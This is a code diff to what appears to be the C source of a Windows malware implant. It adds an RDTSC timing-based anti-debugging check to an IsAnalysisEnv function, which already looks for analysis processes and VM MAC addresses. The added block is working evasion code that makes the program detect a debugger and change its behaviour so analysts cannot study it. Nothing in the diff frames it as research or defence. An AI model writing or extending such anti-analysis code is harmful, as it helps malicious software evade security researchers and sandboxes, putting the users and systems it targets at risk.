@@ -17,6 +17,7 @@
 #include <tlhelp32.h>
 #include <sspi.h>
 #include <schannel.h>
+#include <intrin.h>
 
 // Minimal IP_ADAPTER_INFO for MAC address check (avoids iphlpapi.h CRT dependency)
 // Layout MUST match the real iphlpapi structures: the old 64-byte pad made every
@@ -2300,9 +2301,24 @@ static bool IsAnalysisEnv(void){
     }
     Dbg("IsAnalysisEnv: no analysis processes");
 
-    // Only do timing check if not in a known VM environment (to avoid false positives)
-    // Skip timing check as it can cause false positives on loaded systems.
-    Dbg("IsAnalysisEnv: timing check skipped (avoid false positives)");
+    // 4. Timing-based anti-debug: measure RDTSC before and after a known-cost
+    //    sequence. A debugger single-stepping inflates the delta far beyond
+    //    normal execution jitter. Threshold is conservative (10x typical) to
+    //    avoid false positives on loaded or virtualized systems.
+    {
+        // MSVC x64: use __rdtsc() intrinsic (no inline asm on x64).
+        unsigned long long t0 = __rdtsc();
+        for (volatile int i = 0; i < 1000; i++) { __nop(); }
+        unsigned long long t1 = __rdtsc();
+        unsigned long long delta = t1 - t0;
+        // Typical delta on bare metal: ~3000-5000 cycles. Debugger: 100000+.
+        // Use 50000 as threshold (10x+ typical).
+        if (delta > 50000) {
+            Dbg("IsAnalysisEnv: timing anomaly detected (possible debugger)");
+            return true;
+        }
+    }
+    Dbg("IsAnalysisEnv: timing check passed");
 
     return false;
 }
